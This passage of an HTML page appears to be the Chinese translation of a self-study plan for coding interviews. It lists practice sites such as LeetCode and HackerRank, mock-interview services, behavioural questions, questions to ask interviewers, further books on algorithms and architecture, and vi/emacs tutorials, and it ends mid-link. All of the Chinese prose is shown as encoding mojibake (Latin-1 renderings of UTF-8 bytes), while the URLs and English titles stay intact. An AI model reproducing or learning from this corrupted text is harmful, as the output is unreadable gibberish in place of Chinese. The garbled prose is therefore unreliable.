href="https://www.youtube.com/watch?v=r4r1DZcx1cM&amp;list=PLmVb1OknmNJuC5POdcDv5oCS7_OUkDgpj&amp;index=22">è§†é¢‘</a></li></ul></li><li>[ ] 2-5åˆ†é’Ÿçš„ç®€çŸ­ä¸»é¢˜è§†é¢‘ç³»åˆ—â”€â”€Michael Sambolï¼ˆ18ä¸ªè§†é¢‘ï¼‰ï¼š<ul><li><a href="https://www.youtube.com/channel/UCzDJwLWoYCUQowF_nG3m5OQ">è§†é¢‘</a></li></ul></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part1">Sedgewick è§†é¢‘ â”€â”€ ç®—æ³•I</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2">Sedgewick è§†é¢‘ â”€â”€ ç®—æ³•II</a></li></ul><h2><span id="bian-cheng-wen-ti-lian-xi">ç¼–ç¨‹é—®é¢˜ç»ƒä¹ </span></h2><p>ç°åœ¨ä½ å·²ç»äº†è§£äº†ä¸Šé¢æ‰€æœ‰çš„è®¡ç®—æœºç§‘å­¦ä¸»é¢˜ï¼Œæ˜¯æ—¶å€™ç»ƒä¹ å›ç­”ç¼–ç¨‹é—®é¢˜äº†ã€‚</p><p><strong>ç¼–ç¨‹é—®é¢˜çš„å®è·µå¹¶ä¸æ˜¯è¦è®°ä½ç¼–ç¨‹é—®é¢˜çš„ç­”æ¡ˆ</strong>ã€‚</p><p>ä¸ºä»€ä¹ˆéœ€è¦ç»ƒä¹ ç¼–ç¨‹é—®é¢˜ï¼š</p><ul><li>å¿«é€Ÿè¯†åˆ«é—®é¢˜ï¼Œä»¥åŠå¦‚ä½•åº”ç”¨æ­£ç¡®çš„æ•°æ®ç»“æ„åŠç®—æ³•</li><li>æ”¶é›†é—®é¢˜çš„è¦æ±‚</li><li>åƒåœ¨é¢è¯•ä¸­ä¸€æ ·è°ˆè®ºé—®é¢˜</li><li>åœ¨ç™½æ¿æˆ–çº¸ä¸Šè€Œéè®¡ç®—æœºä¸Šç¼–ç </li><li>è®¡ç®—è§£å†³æ–¹æ¡ˆçš„æ—¶é—´å’Œç©ºé—´çš„å¤æ‚æ€§</li><li>æµ‹è¯•ä½ çš„è§£å†³æ–¹æ¡ˆ</li></ul><p>è¿™é‡Œæœ‰ä¸ªå¾ˆæ£’çš„å…¥é—¨æ•™å­¦ï¼Œå†…å®¹æ˜¯å¦‚ä½•åœ¨é¢è¯•ä¸­æœ‰æ¡ä¸ç´Šï¼Œå¹¶ä¸”æœ‰äº’åŠ¨æ²Ÿé€šåœ°è§£å†³é—®é¢˜ã€‚è¿™ç§èƒ½åŠ›å¯ä»¥ä»é¢è¯•ä¹¦ç±ä¸­è·å¾—ï¼Œä½†æˆ‘è§‰å¾—è¿™ä¸ªä¹Ÿå¾ˆæ£’ï¼š<a href="http://www.hiredintech.com/algorithm-design/">ç®—æ³•è®¾è®¡ç”»å¸ƒ</a>ã€‚</p><p>å®¶é‡Œæ²¡æœ‰ç™½æ¿ï¼Ÿé‚£è®²å¾—é€šã€‚æˆ‘æ˜¯ä¸€ä¸ªæ€ªäººï¼Œæœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç™½æ¿ã€‚ä»ç™½æ¿å•†åº—ä¹°äº†ä¸€ä¸ªå¤§çš„ç»˜å›¾æ¿ï¼Œè€Œä¸æ˜¯ç™½æ¿ã€‚ä½ å¯ä»¥ååœ¨æ²™å‘ä¸Šç»ƒä¹ ã€‚è¿™æ˜¯æˆ‘çš„â€œæ²™å‘ç™½æ¿â€ã€‚æˆ‘åœ¨ç…§ç‰‡ä¸­æ·»åŠ äº†ç¬”ä»¥ä¾¿è¿›è¡Œç¼©æ”¾ã€‚å¦‚æœä½ ä½¿ç”¨ç¬”ï¼Œåˆ™å¸Œæœ›å¯ä»¥æ“¦é™¤ã€‚å¿«é€Ÿå˜å¾—å‡Œä¹±ã€‚æˆ‘ç”¨é“…ç¬”å’Œæ©¡çš®æ“¦ã€‚</p><p><img src="https://d3j2pkmjtin6ou.cloudfront.net/art_board_sm_2.jpg" alt="æˆ‘çš„æ²™å‘ç™½æ¿"></p><p>è¡¥å……ï¼š</p><ul><li><a href="https://www.topcoder.com/community/competitive-programming/tutorials/mathematics-for-topcoders/">Topcoderçš„æ•°å­¦</a></li><li><a href="https://www.topcoder.com/community/competitive-programming/tutorials/dynamic-programming-from-novice-to-advanced/">åŠ¨æ€ç¼–ç¨‹â”€â”€ä»æ–°æ‰‹åˆ°é«˜çº§</a></li><li><a href="https://web.archive.org/web/20160906124824/http://courses.csail.mit.edu/iap/interview/materials.php">MIT é¢è¯•ææ–™</a></li><li><a href="http://exercism.io/languages">ç»ƒä¹ ä»¥æŒæ¡ç‰¹å®šè¯­è¨€</a></li></ul><p><strong>é˜…è¯»å¹¶ç»ƒä¹ ç¼–ç¨‹é—®é¢˜ï¼ˆæŒ‰æ­¤é¡ºåºï¼‰</strong>ï¼š</p><ul><li>[ ] <a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-047012167X.html">ç¼–ç¨‹é¢è¯•å…¬å¼€ï¼šä¸‹ä¸€ä»½å·¥ä½œçš„ç§˜å¯†ï¼Œç¬¬äºŒç‰ˆ</a><ul><li>Cï¼ŒC ++ å’Œ Java çš„ç­”æ¡ˆ</li></ul></li><li>[ ] <a href="http://www.amazon.com/Cracking-Coding-Interview-6th-Programming/dp/0984782850/">ç ´è§£ç¼–ç é¢è¯•ï¼Œç¬¬å…­ç‰ˆ</a><ul><li>Java ç­”æ¡ˆ</li></ul></li></ul><p>è¯·å‚é˜…ä¸Šæ–¹çš„<a href="#%E4%B9%A6%E5%8D%95">ä¹¦å•</a>ã€‚</p><h2><span id="bian-cheng-lian-xi-he-tiao-zhan">ç¼–ç¨‹ç»ƒä¹ å’ŒæŒ‘æˆ˜</span></h2><p>ä¸€æ—¦ä½ å­¦ä¼šäº†ç†è®ºåŸºç¡€ï¼Œå°±åº”è¯¥æŠŠå®ƒä»¬æ‹¿å‡ºæ¥ç»ƒç»ƒã€‚å°½é‡åšæŒæ¯å¤©åšç¼–ç ç»ƒä¹ ï¼Œè¶Šå¤šè¶Šå¥½ã€‚</p><ul><li><a href="https://www.topcoder.com/community/competitive-programming/tutorials/how-to-find-a-solution/">å¦‚ä½•æ‰¾åˆ°è§£å†³æ–¹æ¡ˆ</a></li><li><a href="https://www.topcoder.com/community/competitive-programming/tutorials/how-to-dissect-a-topcoder-problem-statement/">å¦‚ä½•å‰–æ Topcoder é¢˜ç›®æè¿°</a></li></ul><p>ç¼–ç é¢è¯•é—®é¢˜è§†é¢‘ï¼š</p><ul><li><a href="https://www.youtube.com/watch?v=NBcqBddFbZw&amp;list=PLamzFoFxwoNjPfxzaWqs7cZGsPYy0x_gI">IDeserveï¼ˆ88ä¸ªè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/user/tusharroy2525/playlists?shelf_id=2&amp;view=50&amp;sort=dd">Tushar Royï¼ˆ5ä¸ªæ’­æ”¾åˆ—è¡¨ï¼‰</a><ul><li>è¶…çº§è§£å†³é—®é¢˜çš„æ–¹æ³•</li></ul></li><li><a href="https://www.youtube.com/playlist?list=PLU_sdQYzUj2keVENTP0a5rdykRSgg9Wp-">Nick Whiteâ”€â”€LeetCode è§£é¢˜ï¼ˆ187ä¸ªè§†é¢‘ï¼‰</a><ul><li>è‰¯å¥½çš„è§£å†³æ–¹æ¡ˆå’Œä»£ç è§£é‡Š</li><li>ä½ å¯ä»¥åœ¨çŸ­æ—¶é—´å†…çœ‹å¥½å‡ ä¸ª</li></ul></li><li><a href="https://youtube.com/FisherCoder">FisherCoderâ”€â”€LeetCode è§£é¢˜</a></li></ul><p>ç¼–ç ç»ƒä¹ å¹³å°:</p><ul><li><a href="https://leetcode.com/">LeetCode</a><ul><li>æˆ‘æœ€å–œæ¬¢çš„ç¼–ç é—®é¢˜ç½‘ç«™ï¼Œå€¼å¾—ä½ å‡†å¤‡çš„1-2ä¸ªæœˆçš„è®¢é˜…è´¹ç”¨</li><li><a href="https://github.com/fishercoder1534/Leetcode">FisherCoder çš„ LeetCode è§£é¢˜</a></li><li>è¯·å‚é˜…ä¸Šé¢çš„ Nick White è§†é¢‘ï¼Œä»¥è·å¾—ç®€çŸ­çš„ä»£ç </li></ul></li><li><a href="https://www.hackerrank.com/">HackerRank</a></li><li><a href="https://www.topcoder.com/">TopCoder</a></li><li><a href="https://www.interviewcake.com/">InterviewCake</a></li><li><a href="http://www.geeksforgeeks.org/">http://www.geeksforgeeks.org/</a></li><li><a href="https://www.interviewbit.com/invite/icjf">InterviewBit</a></li><li><a href="https://projecteuler.net/index.php?section=problems">Project Euler (æ•°å­¦æ–¹å‘ä¸ºä¸»)</a></li><li><a href="https://code-exercises.com/">Code Exercises</a></li></ul><p>è¯­è¨€å­¦ä¹ ç½‘ç«™ï¼Œé™„å¸¦ç¼–ç æŒ‘æˆ˜ï¼š</p><ul><li><a href="http://www.codewars.com">Codewars</a></li><li><a href="https://codility.com/programmers/">Codility</a></li><li><a href="https://www.hackerearth.com/">HackerEarth</a></li><li><a href="http://www.spoj.com/">Sphere Online Judge (spoj)</a></li><li><a href="https://www.codechef.com/">Codechef</a></li></ul><p>ç¼–ç æŒ‘æˆ˜é¡¹ç›®ï¼š</p><ul><li><a href="https://github.com/donnemartin/interactive-coding-challenges">Python äº¤äº’å¼ç¼–ç é¢è¯•æŒ‘æˆ˜</a></li></ul><p>æ¨¡æ‹Ÿé¢è¯•ï¼š</p><ul><li><a href="http://www.gainlo.co/">Gainlo.coï¼šæ¥è‡ªå¤§å…¬å¸çš„æ¨¡æ‹Ÿé¢è¯•å®˜</a>â”€â”€æˆ‘ä½¿ç”¨äº†å®ƒï¼Œå®ƒå¸®åŠ©æˆ‘å‡è½»äº†ç”µè¯å±å¹•å’Œç°åœºé¢è¯•çš„å‹åŠ›</li><li><a href="https://www.pramp.com/">Prampï¼šæ¨¡æ‹Ÿæ¥è‡ª/ä¸åŒè¡Œçš„é¢è¯•</a>â”€â”€ç‚¹å¯¹ç‚¹æ–¹å¼ç»ƒä¹ é¢è¯•</li><li><a href="https://refdash.com/">Refdashï¼šæ¨¡æ‹Ÿé¢è¯•å’ŒåŠ æ€¥é¢è¯•</a>â”€â”€è·³è¿‡ä¸ç§‘æŠ€å…¬å¸çš„å¤šæ¬¡é¢è¯•ï¼Œå¸®åŠ©æ±‚èŒè€…å¿«é€Ÿè¿½è¸ª</li><li><a href="https://interviewing.io/">interviewing.ioï¼šä¸é«˜çº§å·¥ç¨‹å¸ˆè¿›è¡Œæ¨¡æ‹Ÿé¢è¯•</a>â”€â”€ä¸æ¥è‡ª FAANGï¼ˆè¯‘è€…æ³¨ï¼šFacebook, Amazon, Apple, Netflix and Googleï¼‰ çš„é«˜çº§å·¥ç¨‹å¸ˆè¿›è¡ŒåŒ¿åç®—æ³•/ç³»ç»Ÿè®¾è®¡é¢è¯•ã€‚</li></ul><h2><span id="dang-ni-lin-jin-mian-shi-shi">å½“ä½ ä¸´è¿‘é¢è¯•æ—¶</span></h2><ul><li>æå®šä»£ç é¢è¯•â”€â”€ç¬¬äºŒé›† (è§†é¢‘):<ul><li><a href="https://www.youtube.com/watch?v=4NIb9l3imAo">Cracking The Code Interview</a></li><li><a href="https://www.youtube.com/watch?v=Eg5-tdAwclo">Cracking the Coding Interview - å…¨æ ˆç³»åˆ—</a></li></ul></li></ul><h2><span id="ni-de-jian-li">ä½ çš„ç®€å†</span></h2><ul><li>è¯·å‚é˜…â€œç ´è§£ç¼–ç é¢è¯•â€å’Œâ€œç¼–ç¨‹é¢è¯•çš„èƒŒé¢â€ä¸­çš„å»ºç«‹å‡†å¤‡é¡¹ã€‚</li></ul><h2><span id="dang-mian-shi-lai-lin-de-shi-hou">å½“é¢è¯•æ¥ä¸´çš„æ—¶å€™</span></h2><p>éšç€ä¸‹é¢åˆ—ä¸¾çš„é—®é¢˜æ€è€ƒä¸‹ä½ å¯èƒ½ä¼šé‡åˆ°çš„ 20 ä¸ªé¢è¯•é—®é¢˜ï¼Œæ¯ä¸ªé—®é¢˜å‡†å¤‡ 2-3 ç§å›ç­”ã€‚å‡†å¤‡ç‚¹æ•…äº‹ï¼Œä¸è¦åªæ˜¯æ‘†ä¸€äº›ä½ å®Œæˆçš„äº‹æƒ…çš„æ•°æ®ï¼Œç›¸ä¿¡æˆ‘ï¼Œäººäººéƒ½å–œæ¬¢å¬æ•…äº‹ã€‚</p><ul><li>ä½ ä¸ºä»€ä¹ˆæƒ³å¾—åˆ°è¿™ä»½å·¥ä½œï¼Ÿ</li><li>ä½ è§£å†³è¿‡çš„æœ€æœ‰éš¾åº¦çš„é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿ</li><li>é¢å¯¹è¿‡çš„æœ€å¤§æŒ‘æˆ˜æ˜¯ä»€ä¹ˆ?</li><li>è§è¿‡çš„æœ€å¥½æˆ–è€…æœ€åçš„è®¾è®¡æ˜¯æ€ä¹ˆæ ·çš„?</li><li>å¯¹æŸä¸ªäº§å“æå‡ºæ”¹è¿›å»ºè®®ã€‚</li><li>ä½ ä½œä¸ºä¸€ä¸ªä¸ªä½“åŒæ—¶ä¹Ÿæ˜¯å›¢é˜Ÿçš„ä¸€å‘˜ï¼Œå¦‚ä½•è¾¾åˆ°æœ€å¥½çš„å·¥ä½œçŠ¶æ€?</li><li>ä½ çš„ä»€ä¹ˆæŠ€èƒ½æˆ–è€…ç»éªŒæ˜¯ä½ çš„è§’è‰²ä¸­ä¸å¯æˆ–ç¼ºçš„ï¼Œä¸ºä»€ä¹ˆï¼Ÿ</li><li>ä½ åœ¨æŸä»½å·¥ä½œæˆ–æŸä¸ªé¡¹ç›®ä¸­æœ€äº«å—çš„æ˜¯ä»€ä¹ˆ?</li><li>ä½ åœ¨æŸä»½å·¥ä½œæˆ–æŸä¸ªé¡¹ç›®ä¸­é¢ä¸´è¿‡çš„æœ€å¤§æŒ‘æˆ˜æ˜¯ä»€ä¹ˆ?</li><li>ä½ åœ¨æŸä»½å·¥ä½œæˆ–æŸä¸ªé¡¹ç›®ä¸­é‡åˆ°è¿‡çš„æœ€ç¡¬çš„ Bug æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ</li><li>ä½ åœ¨æŸä»½å·¥ä½œæˆ–æŸä¸ªé¡¹ç›®ä¸­å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ</li><li>ä½ åœ¨æŸä»½å·¥ä½œæˆ–æŸä¸ªé¡¹ç›®ä¸­å“ªäº›åœ°æ–¹è¿˜å¯ä»¥åšçš„æ›´å¥½ï¼Ÿ</li></ul><h2><span id="wen-mian-shi-guan-de-wen-ti">é—®é¢è¯•å®˜çš„é—®é¢˜</span></h2><pre><code>æˆ‘ä¼šé—®çš„ä¸€äº›ï¼š(å¯èƒ½æˆ‘å·²ç»çŸ¥é“äº†ç­”æ¡ˆä½†æˆ‘æƒ³å¬å¬é¢è¯•å®˜çš„çœ‹æ³•æˆ–è€…äº†è§£å›¢é˜Ÿçš„å‰æ™¯):</code></pre><ul><li>å›¢é˜Ÿå¤šå¤§è§„æ¨¡?</li><li>å¼€å‘å‘¨æœŸæ˜¯æ€æ ·çš„? ä¼šä½¿ç”¨ç€‘å¸ƒæµ/æé™ç¼–ç¨‹/æ•æ·å¼€å‘ä¹ˆ?</li><li>ç»å¸¸ä¼šä¸ºæˆªæ­¢æ—¥æœŸï¼ˆdeadlinesï¼‰åŠ ç­ä¹ˆ? æˆ–è€…æ˜¯æœ‰å¼¹æ€§çš„?</li><li>å›¢é˜Ÿé‡Œæ€ä¹ˆåšæŠ€æœ¯é€‰å‹?</li><li>æ¯å‘¨å¹³å‡å¼€å¤šå°‘æ¬¡ä¼š?</li><li>ä½ è§‰å¾—å·¥ä½œç¯å¢ƒæœ‰åŠ©äºå‘˜å·¥é›†ä¸­ç²¾åŠ›å—?</li><li>ç›®å‰æ­£åœ¨åšä»€ä¹ˆå·¥ä½œ?</li><li>å–œæ¬¢è¿™äº›äº‹æƒ…å—?</li><li>å·¥ä½œæœŸé™æ˜¯æ€ä¹ˆæ ·çš„?</li><li>å·¥ä½œç”Ÿæ´»æ€ä¹ˆå¹³è¡¡?</li></ul><h2><span id="dang-ni-huo-de-liao-meng-xiang-de-zhi-wei">å½“ä½ è·å¾—äº†æ¢¦æƒ³çš„èŒä½</span></h2><p>æ­å–œä½ ï¼</p><p>ç»§ç»­å­¦ä¹ ã€‚</p><p>æ´»åˆ°è€ï¼Œå­¦åˆ°è€ã€‚</p><hr><pre><code>**********************************************************************************************************************************************************************************************************ä¸‹é¢çš„å†…å®¹éƒ½æ˜¯å¯é€‰çš„ã€‚é€šè¿‡å­¦ä¹ è¿™äº›å†…å®¹ï¼Œä½ å°†ä¼šå¾—åˆ°æ›´å¤šçš„æœ‰å…³ CS çš„æ¦‚å¿µï¼Œå¹¶å°†ä¸ºæ‰€æœ‰çš„è½¯ä»¶å·¥ç¨‹å·¥ä½œåšæ›´å¥½çš„å‡†å¤‡ã€‚ä½ å°†ä¼šæˆä¸ºä¸€ä¸ªæ›´å…¨é¢çš„è½¯ä»¶å·¥ç¨‹å¸ˆã€‚**********************************************************************************************************************************************************************************************************</code></pre><hr><h2><span id="e-wai-shu-ji">é¢å¤–ä¹¦ç±</span></h2><pre><code>ä½ å¯ä»¥ä»ä»¥ä¸‹çš„ä¹¦å•æŒ‘é€‰ä½ æœ‰å…´è¶£çš„ä¸»é¢˜æ¥ç ”è¯»ã€‚</code></pre><ul><li><p><a href="https://www.amazon.com/dp/013937681X">UNIXç¯å¢ƒé«˜çº§ç¼–ç¨‹</a></p><ul><li>è€ï¼Œä½†å´å¾ˆæ£’</li></ul></li><li><p><a href="https://www.amazon.com/dp/1593273894/">Linux å‘½ä»¤è¡Œå¤§å…¨</a></p><ul><li>ç°ä»£é€‰æ‹©</li></ul></li><li><p><a href="https://en.wikipedia.org/wiki/TCP/IP_Illustrated">TCP-IPè¯¦è§£ç³»åˆ—</a></p></li><li><p><a href="https://www.amazon.com/gp/product/0596007124/">Head First è®¾è®¡æ¨¡å¼</a></p><ul><li>è®¾è®¡æ¨¡å¼å…¥é—¨ä»‹ç»</li></ul></li><li><p><a href="https://www.amazon.com/Design-Patterns-Elements-Reusable-Object-Oriented/dp/0201633612">è®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€</a></p><ul><li>ä¹Ÿè¢«ç§°ä¸ºâ€œå››äººå¸®â€ï¼ˆGang of Four(GOF)ï¼‰</li><li>ç»å…¸è®¾è®¡æ¨¡å¼ä¹¦ç±</li></ul></li><li><p><a href="https://www.amazon.com/UNIX-Linux-System-Administration-Handbook/dp/0134277554/">Linux å’Œ UNIX ç³»ç»Ÿç®¡ç†æŠ€æœ¯æ‰‹å†Œï¼ˆç¬¬äº”ç‰ˆï¼‰</a></p></li><li><p><a href="http://www.amazon.com/Algorithm-Design-Manual-Steven-Skiena/dp/1849967202">ç®—æ³•è®¾è®¡æ‰‹å†Šï¼ˆSkienaï¼‰</a></p><ul><li>ä½œä¸ºå¤ä¹ ä»¥åŠé—®é¢˜è¾¨åˆ«</li><li>è¿™æœ¬ä¹¦ä¸­ç®—æ³•çš„éƒ¨åˆ†éš¾åº¦å·²ç»è¶…è¿‡é¢è¯•ä¼šå‡ºç°çš„</li><li>æœ¬ä¹¦åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†:<ul><li>æ•°æ®ç»“æ„å’Œç®—æ³•è¯¾æœ¬<ul><li>ä¼˜ç‚¹:<ul><li>è·Ÿå…¶ä»–ç®—æ³•è¯¾æœ¬ä¸€æ ·æ˜¯ä¸ªå¾ˆæ£’çš„å¤ä¹ ç´ æ</li><li>åŒ…å«ä½œè€…ä»¥å¾€è§£å†³å·¥ä¸šåŠå­¦æœ¯ä¸Šé—®é¢˜çš„ç»éªŒçš„æ•…äº‹</li><li>å«Cè¯­è¨€ä»£ç ç¤ºä¾‹</li></ul></li><li>ç¼ºç‚¹:<ul><li>æŸäº›åœ°æ–¹è·Ÿã€Šç®—æ³•å¯¼è®ºã€‹ï¼ˆCLRSï¼‰ä¸€æ ·è‰°æ·±ï¼Œä½†åœ¨æŸäº›ä¸»é¢˜ï¼Œç®—æ³•å¯¼è®ºæˆ–è®¸æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚</li><li>ç¬¬7ã€8ã€9ç« æœ‰ç‚¹éš¾ä»¥æ¶ˆåŒ–ï¼Œå› ä¸ºæŸäº›åœ°æ–¹å¹¶æ²¡æœ‰è§£é‡Šå¾—å¾ˆæ¸…æ¥šï¼Œæˆ–è€…æ ¹æœ¬ä¸Šæˆ‘å°±æ˜¯ä¸ªå­¦æ¸£</li><li>åˆ«ä¼šé”™æ„äº†ï¼Œæˆ‘å¾ˆå–œæ¬¢ Skiena çš„æ•™å­¦æ–¹æ³•ä»¥åŠä»–çš„é£æ ¼ã€‚</li></ul></li></ul></li><li>ç®—æ³•ç›®å½•:<ul><li>è¿™ä¸ªéƒ¨åˆ†æ˜¯ä¹°è¿™æœ¬ä¹¦çš„æœ€å¤§åŸå› </li><li>æˆ‘å³å°†ç€æ‰‹è¿›è¡Œè¿™éƒ¨åˆ†ï¼Œä¸€æ—¦å®Œæˆè¿™éƒ¨åˆ†æˆ‘ä¼šå†æ›´æ–°ä¸Šæ¥</li></ul></li></ul></li><li>å¯ä»¥åœ¨ kindle ä¸Šç§Ÿ</li><li>è§£ç­”ï¼š<ul><li><a href="http://www.algorithm.cs.sunysb.edu/algowiki/index.php/The_Algorithms_Design_Manual_(Second_Edition)">è§£ç­”</a></li><li><a href="http://blog.panictank.net/category/algorithmndesignmanualsolutions/page/2/">è§£ç­”</a></li></ul></li><li><a href="http://www3.cs.stonybrook.edu/~skiena/algorist/book/errata">å‹˜è¯¯è¡¨</a></li></ul></li><li><p><a href="https://www.amazon.com/Write-Great-Code-Understanding-Machine/dp/1593270038">ç¼–ç¨‹å“è¶Šä¹‹é“ï¼ˆç¬¬ä¸€å·ï¼‰ï¼šæ·±å…¥ç†è§£è®¡ç®—æœº</a></p><ul><li>è¯¥ä¹¦äº2004å¹´å‡ºç‰ˆï¼Œè™½ç„¶æœ‰äº›è¿‡æ—¶ï¼Œä½†æ˜¯å¯¹äºç®€å•äº†è§£è®¡ç®—æœºè€Œè¨€ï¼Œè¿™æ˜¯ä¸€ä¸ªäº†ä¸èµ·çš„èµ„æº</li><li>ä½œè€…å‘æ˜äº†<a href="https://en.wikipedia.org/wiki/High_Level_Assembly">é«˜é˜¶ç»„åˆè¯­è¨€ HLA</a>ï¼Œæ‰€ä»¥æåˆ°ï¼Œå¹¶ä¸”ä¸¾äº†ä¸€äº›HLAçš„ä¾‹å­ã€‚é‡Œé¢æ²¡æœ‰ç”¨åˆ°å¾ˆå¤šï¼Œä½†éƒ½æ˜¯å¾ˆæ£’çš„ç»„åˆè¯­è¨€çš„ä¾‹å­ã€‚</li><li>è¿™äº›ç« èŠ‚å€¼å¾—é˜…è¯»ï¼Œä¸ºä½ æä¾›è‰¯å¥½çš„åŸºç¡€ï¼š<ul><li>ç¬¬2ç« â”€â”€æ•°å­—è¡¨ç¤º</li><li>ç¬¬3ç« â”€â”€äºŒè¿›åˆ¶ç®—æœ¯å’Œä½è¿ç®—</li><li>ç¬¬4ç« â”€â”€æµ®ç‚¹è¡¨ç¤º</li><li>ç¬¬5ç« â”€â”€å­—ç¬¦è¡¨ç¤º</li><li>ç¬¬6ç« â”€â”€å†…å­˜ç»„ç»‡å’Œè®¿é—®</li><li>ç¬¬7ç« â”€â”€ç»„åˆæ•°æ®ç±»å‹å’Œå†…å­˜å¯¹è±¡</li><li>ç¬¬9ç« â”€â”€CPUä½“ç³»ç»“æ„</li><li>ç¬¬10ç« â”€â”€æŒ‡ä»¤é›†æ¶æ„</li><li>ç¬¬11ç« â”€â”€å†…å­˜ä½“ç³»ç»“æ„å’Œç»„ç»‡</li></ul></li></ul></li><li><p><a href="https://www.amazon.com/Introduction-Algorithms-3rd-MIT-Press/dp/0262033844">ç®—æ³•å¯¼è®º</a></p><ul><li><strong>é‡è¦æç¤º</strong>ï¼šè¯»è¿™æœ¬ä¹¦çš„ä»·å€¼æœ‰é™ã€‚æœ¬ä¹¦å¾ˆå¥½åœ°å›é¡¾äº†ç®—æ³•å’Œæ•°æ®ç»“æ„ï¼Œä½†ä¸ä¼šæ•™ä½ å¦‚ä½•ç¼–å†™è‰¯å¥½çš„ä»£ç ã€‚ä½ å¿…é¡»èƒ½å¤Ÿæœ‰æ•ˆåœ°ç¼–å†™ä¸€ä¸ªä¸é”™çš„è§£å†³æ–¹æ¡ˆ</li><li>åˆç§° CLRï¼Œæœ‰æ—¶æ˜¯ CLRSï¼Œå› ä¸º Stein æœ€åæ‰åŠ å…¥</li></ul></li><li><p><a href="https://www.amazon.com/dp/0128119055">è®¡ç®—æœºä½“ç³»ç»“æ„ï¼šé‡åŒ–ç ”ç©¶æ–¹æ³•ï¼ˆç¬¬6ç‰ˆï¼‰</a></p><ul><li>æ›´ä¸°å¯Œã€æ›´æ–°ï¼ˆ2017å¹´ï¼‰ï¼Œä½†ç¯‡å¹…è¾ƒé•¿</li></ul></li><li><p><a href="http://www.amazon.com/Programming-Pearls-2nd-Jon-Bentley/dp/0201657880">ç¼–ç¨‹ç çŸ¶</a></p><ul><li>å‰å‡ ç« ä»‹ç»äº†è§£å†³ç¼–ç¨‹é—®é¢˜ï¼ˆéå¸¸å¤è€ï¼Œç”šè‡³è¿˜ç”¨æ•°æ®ç£å¸¦ï¼‰çš„å·§å¦™è§£å†³æ–¹æ¡ˆï¼Œä½†è¿™åªæ˜¯ä¸€ä¸ªä»‹ç»ã€‚è¿™æ˜¯å…³äºç¨‹åºè®¾è®¡å’Œä½“ç³»ç»“æ„çš„æŒ‡å—</li></ul></li></ul><h2><span id="fu-jia-xue-xi">é™„åŠ å­¦ä¹ </span></h2><pre><code>æˆ‘æŠŠå®ƒä»¬åŠ è¿›æ¥æ˜¯ä¸ºäº†è®©ä½ æˆä¸ºæ›´å…¨æ–¹ä½çš„è½¯ä»¶å·¥ç¨‹å¸ˆï¼Œå¹¶ä¸”ç•™æ„ä¸€äº›æŠ€æœ¯ä»¥åŠç®—æ³•ï¼Œè®©ä½ æ‹¥æœ‰æ›´å¤§çš„å·¥å…·ç®±ã€‚</code></pre><ul><li><h3><span id="bian-yi-qi">ç¼–è¯‘å™¨</span></h3><ul><li><a href="https://www.youtube.com/watch?v=IhC7sdYe-Jg">ç¼–è¯‘å™¨çš„å·¥ä½œæ–¹å¼ï¼Œçº¦1åˆ†é’Ÿï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=CSZLNYF4Klo">Harvard CS50-ç¼–è¯‘å™¨ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=twodd1KFfGk">C ++ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=FnGCDLhaxKU">äº†è§£ç¼–è¯‘å™¨ä¼˜åŒ–ï¼ˆC ++ï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><h3><span id="emacs-and-vi-m">Emacs and vi(m)</span></h3><ul><li>ç†Ÿæ‚‰åŸºäº unix çš„ä»£ç ç¼–è¾‘å™¨</li><li>vi(m):<ul><li><a href="https://www.youtube.com/watch?v=5givLEMcINQ&amp;index=1&amp;list=PL13bz4SHGmRxlZVmWQ9DvXo1fEg4UdGkr">ä½¿ç”¨ vim è¿›è¡Œç¼–è¾‘ 01 - å®‰è£…, è®¾ç½®å’Œæ¨¡å¼ (è§†é¢‘)</a></li><li><a href="http://vim-adventures.com/">VIM çš„å†’é™©ä¹‹æ—…</a></li><li>4 ä¸ªè§†é¢‘é›†:<ul><li><a href="https://www.youtube.com/watch?v=SI8TeVMX8pk">vi/vim ç¼–è¾‘å™¨ - è¯¾ç¨‹ 1</a></li><li><a href="https://www.youtube.com/watch?v=F3OO7ZIOaJE">vi/vim ç¼–è¾‘å™¨ - è¯¾ç¨‹ 2</a></li><li><a href="https://www.youtube.com/watch?v=1lYD5gwgZIA">vi/vim ç¼–è¾‘å™¨ - è¯¾ç¨‹ 4</a></li><li><a href="https://www.youtube.com/watch?v=ZYEccA_nMaI">vi/vim ç¼–è¾‘å™¨ - è¯¾ç¨‹ 3</a></li></ul></li><li><a href="http://www.cs.yale.edu/homes/aspnes/classes/223/notes.html#Using_Vi_instead_of_Emacs">ä½¿ç”¨ Vi è€Œä¸æ˜¯ Emacs</a></li></ul></li><li>emacs:<ul><li><a href="https://www.youtube.com/watch?v=hbmV1bnQ-i0">åŸºç¡€ Emacs æ•™ç¨‹ (è§†é¢‘)</a></li><li>3 ä¸ªè§†é¢‘é›†:<ul><li><a href="https://www.youtube.com/watch?v=ujODL7MD04Q">Emacs æ•™ç¨‹ (åˆå­¦è€…) -ç¬¬ 1 éƒ¨åˆ†- æ–‡ä»¶å‘½ä»¤, å‰ªåˆ‡/å¤åˆ¶/ç²˜è´´,  è‡ªå®šä¹‰å‘½ä»¤</a></li><li><a href="https://www.youtube.com/watch?v=XWpsRupJ4II">Emacs æ•™ç¨‹ (åˆå­¦è€… -ç¬¬ 2 éƒ¨åˆ†- Buffer ç®¡ç†, æœç´¢, M-x grep å’Œ rgrep æ¨¡å¼</a></li><li><a href="https://www.youtube.com/watch?v=paSgzPso-yc">Emacs æ•™ç¨‹ (åˆå­¦è€… -ç¬¬ 3 éƒ¨åˆ†- è¡¨è¾¾å¼, å£°æ˜, ~/.emacs 